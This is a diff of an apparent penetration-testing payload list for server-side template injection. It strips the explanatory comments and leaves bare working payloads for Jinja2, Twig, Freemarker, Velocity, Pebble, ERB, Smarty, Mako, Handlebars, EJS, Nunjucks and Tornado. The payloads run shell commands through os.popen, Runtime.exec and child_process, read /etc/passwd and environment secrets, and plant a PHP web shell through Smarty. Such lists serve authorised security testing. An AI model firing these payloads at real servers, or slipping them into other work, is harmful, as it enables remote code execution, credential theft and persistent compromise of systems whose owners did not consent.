@@ -1,10 +1,8 @@
 # ============================================================
 # SSTI — Server-Side Template Injection
-# Use: Burp Repeater, inject in any reflected input
-# Detection: math expressions evaluated = SSTI
 # ============================================================
 
-# ---- Detection Polyglot (send first, check which evaluates) ----
+# ---- Detection Polyglot ----
 {{7*7}}
 ${7*7}
 #{7*7}
@@ -20,75 +18,38 @@ ${{"7"*7}}
 @(7*7)
 $[7*7]
 
-# ---- Jinja2 (Python — Flask, Ansible, etc.) ----
-
-# Detection
-{{7*7}}              # → 49
-{{7*'7'}}            # → 7777777
-
-# RCE — config object
+# ---- Jinja2 ----
 {{config}}
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{config.items()}}
-
-# RCE — MRO chain (most reliable)
 {{''.__class__.__mro__[1].__subclasses__()}}
 {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
 {{''.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").system("id")')}}
-
-# RCE — request.application
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-
-# RCE — cycler
 {{cycler.__init__.__globals__.os.popen('id').read()}}
-
-# RCE — joiner/namespace
 {{joiner.__init__.__globals__.os.popen('id').read()}}
 {{namespace.__init__.__globals__.os.popen('id').read()}}
-
-# Filter bypass (when dots/brackets filtered)
 {{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
-
-# Blind SSTI — sleep
 {{lipsum.__globals__['os'].popen('sleep 5').read()}}
 
-# ---- Twig (PHP — Symfony, Craft CMS, etc.) ----
-
-# Detection
-{{7*7}}              # → 49
-{{7*'7'}}            # → 49 (Twig) vs 7777777 (Jinja2) — key difference
-
-# Info disclosure
+# ---- Twig ----
 {{_self.env.getExtensions()}}
 {{dump(_context)}}
 {{app.request}}
 {{app.user}}
-
-# RCE
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 {{['id']|filter('system')}}
 {{['id','']|sort('system')}}
 {{'id'|filter('system')}}
 
-# ---- Freemarker (Java) ----
-
-# Detection
-${7*7}               # → 49
-
-# RCE
+# ---- Freemarker ----
 ${"freemarker.template.utility.Execute"?new()("id")}
 ${product.getClass().forName("java.lang.Runtime").getMethod("exec",String.class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
 <#assign ex="freemarker.template.utility.Execute"?new()><#assign x=ex("id")>${x}
-
-# Info
 ${.data_model}
 
-# ---- Velocity (Java) ----
-
-# Detection
-#set($x = 7*7)$x     # → 49
-
-# RCE
+# ---- Velocity ----
+#set($x = 7*7)$x
 #set($rt = $class.forName('java.lang.Runtime'))
 #set($proc = $rt.exec("id"))
 #set($is = $proc.getInputStream())
@@ -98,47 +59,26 @@ ${.data_model}
 #set($buf = $sbr.newInstance($res))
 $buf.readLine()
 
-# ---- Pebble (Java) ----
-
-# Detection
-{{ 7*7 }}            # → 49
-
-# RCE
+# ---- Pebble ----
 {% set cmd = "id" %}
 {% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
 {{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance([bytes]) }}
 
-# ---- ERB (Ruby — Rails) ----
-
-# Detection
-<%= 7*7 %>           # → 49
-
-# RCE
+# ---- ERB ----
 <%= system("id") %>
 <%= `id` %>
 <%= IO.popen("id").read %>
 <%= require 'open3'; Open3.capture2("id")[0] %>
-
-# Info
 <%= ENV %>
 <%= File.read('/etc/passwd') %>
 
-# ---- Smarty (PHP) ----
-
-# Detection
-{$smarty.version}    # leaks version
-{math equation="7*7"}   # → 49
-
-# RCE
+# ---- Smarty ----
+{$smarty.version}
+{math equation="7*7"}
 {php}echo `id`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}
 
-# ---- Mako (Python) ----
-
-# Detection
-${7*7}               # → 49
-
-# RCE
+# ---- Mako ----
 ${__import__('os').popen('id').read()}
 <%
     import os
@@ -146,13 +86,8 @@ ${__import__('os').popen('id').read()}
 %>
 ${x}
 
-# ---- Handlebars (JavaScript/Node.js) ----
-
-# Detection
-{{7*7}}              # → not evaluated (Handlebars is logic-less)
-{{this}}             # leaks context
-
-# RCE (via prototype pollution + helpers)
+# ---- Handlebars ----
+{{this}}
 {{#with "s" as |string|}}
   {{#with "e"}}
     {{#with split as |conslist|}}
@@ -173,19 +108,15 @@ ${x}
   {{/with}}
 {{/with}}
 
-# ---- EJS (JavaScript/Node.js) ----
-<%= 7*7 %>           # → 49
+# ---- EJS ----
 <%= global.process.mainModule.require('child_process').execSync('id') %>
 
-# ---- Nunjucks (JavaScript/Node.js) ----
-{{7*7}}              # → 49
+# ---- Nunjucks ----
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
 
 # ---- Go Templates ----
-{{7*7}}              # → not evaluated
-{{.}}                # leaks context object
+{{.}}
 {{printf "%s" .}}
 
-# ---- Tornado (Python) ----
-{{7*7}}              # → 49
+# ---- Tornado ----
 {% import os %}{{os.popen("id").read()}}
